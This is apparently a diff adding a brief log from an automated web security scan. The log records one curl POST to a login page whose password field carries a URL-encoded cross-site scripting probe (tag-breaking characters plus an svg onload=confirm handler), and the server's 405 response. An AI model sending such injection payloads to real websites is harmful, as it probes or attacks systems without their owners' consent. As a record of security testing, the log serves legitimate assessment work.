@@ -1,0 +1,7 @@
+# command: timeout 20 curl -s -m 18 -o - -w '\nHTTP_STATUS:%{http_code}\nCTYPE:%{content_type}' -X POST -H 'Content-Type: application/x-www-form-urlencoded' -d password=s5x300016ea%22%27%3E%3C%2Ftitle%3E%3C%2Fscript%3E%3Csvg+onload%3Dconfirm%281%29%3E https://duck-store.escape.tech/login
+# exit_code: 0
+# ---
+
+
+HTTP_STATUS:405
+CTYPE:
